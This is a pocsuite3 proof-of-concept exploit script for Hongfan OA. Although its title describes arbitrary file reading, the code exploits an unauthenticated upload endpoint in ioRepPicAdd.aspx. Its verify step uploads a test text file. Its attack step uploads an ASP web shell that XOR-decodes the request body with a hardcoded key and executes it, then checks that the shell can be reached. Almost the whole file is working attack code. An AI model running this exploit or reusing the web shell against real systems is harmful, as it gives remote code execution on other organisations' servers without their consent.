from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict,OptString
from pocsuite3.api import get_listener_ip, get_listener_port,REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '红帆OA ioFileExport.aspx任意文件读取'
    appName = '红帆 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''None'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('',require=False)
        return o

    def _verify(self, verify=True):
        result = {}
        headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary92UKW0leBBAHGaI4',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        data = '''------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__EVENTTARGET"

ctl00$cntButton$cmdOK
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__EVENTARGUMENT"


------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTQwODAxNTczOQ9kFgJmDw8WBh4JUGFnZVRpdGxlBQzmt7vliqDlm77niYceDFBhZ2VUaXRsZVNlbAspZWlPZmZpY2UuaW9QYWdlRWRpdCtQYWdlVGl0bGVTZWxPcHRpb24sIGlPZmZpY2UsIFZlcnNpb249MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsAx4McGVyY2VudHdpZHRoAv////8PZBYCAgMPZBYCAgEPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGEWAgIFD2QWAmYPZBYCZg9kFggCAw8PFgIeB1Zpc2libGVoZBYCAgEPDxYCHgRUZXh0BQzmt7vliqDlm77niYdkZAIFDw8WAh8EaGQWAgIBDw8WAh8FBQzmt7vliqDlm77niYdkZAIHDxYCHwRoZAILD2QWAgIDDw9kFgIeB29uY2xpY2sFDndpbmRvdy5jbG9zZSgpZGQ=
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="ctl00$cntForm$File1"; filename="hiword.txt"
Content-Type: image/png

hiword!!!

------WebKitFormBoundary92UKW0leBBAHGaI4--'''

        vul_url = self.url+"/ioffice/prg/set/Report/ioRepPicAdd.aspx"
        try:
            resp = requests.post(vul_url,data=data,headers=headers,verify=False,timeout=10)
            r1 = requests.get(url=self.url+"/iOffice/upfiles/rep/pic/hiword.txt")
            if resp.status_code == 200 and "cultureInfo" in resp.text and "hiword!!!" in r1.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = self.url+"/iOffice/upfiles/rep/pic/hiword.txt"
            return self.parse_output(result)
        except:
            pass

    def _attack(self):
        result = {}
        headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary92UKW0leBBAHGaI4',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        data = '''------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__EVENTTARGET"

ctl00$cntButton$cmdOK
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__EVENTARGUMENT"


------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTQwODAxNTczOQ9kFgJmDw8WBh4JUGFnZVRpdGxlBQzmt7vliqDlm77niYceDFBhZ2VUaXRsZVNlbAspZWlPZmZpY2UuaW9QYWdlRWRpdCtQYWdlVGl0bGVTZWxPcHRpb24sIGlPZmZpY2UsIFZlcnNpb249MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsAx4McGVyY2VudHdpZHRoAv////8PZBYCAgMPZBYCAgEPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGEWAgIFD2QWAmYPZBYCZg9kFggCAw8PFgIeB1Zpc2libGVoZBYCAgEPDxYCHgRUZXh0BQzmt7vliqDlm77niYdkZAIFDw8WAh8EaGQWAgIBDw8WAh8FBQzmt7vliqDlm77niYdkZAIHDxYCHwRoZAILD2QWAgIDDw9kFgIeB29uY2xpY2sFDndpbmRvdy5jbG9zZSgpZGQ=
------WebKitFormBoundary92UKW0leBBAHGaI4
Content-Disposition: form-data; name="ctl00$cntForm$File1"; filename="Tesshell.asp"
Content-Type: image/png

<html>
<body>
<%
Response.CharSet = "UTF-8" 
k="e45e329feb5d925b"
Session("k")=k
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
%>
</body>
</html>
------WebKitFormBoundary92UKW0leBBAHGaI4--'''

        vul_url = self.url+"/ioffice/prg/set/Report/ioRepPicAdd.aspx"
        resp = requests.post(vul_url,data=data,headers=headers,verify=False,timeout=10)
        r1 = requests.get(url=self.url+"/iOffice/upfiles/rep/pic/Tesshell.asp")
        if resp.status_code == 200 and "cultureInfo" in resp.text and r1.status_code==200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Content'] = "/iOffice/upfiles/rep/pic/Tesshell.asp"
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
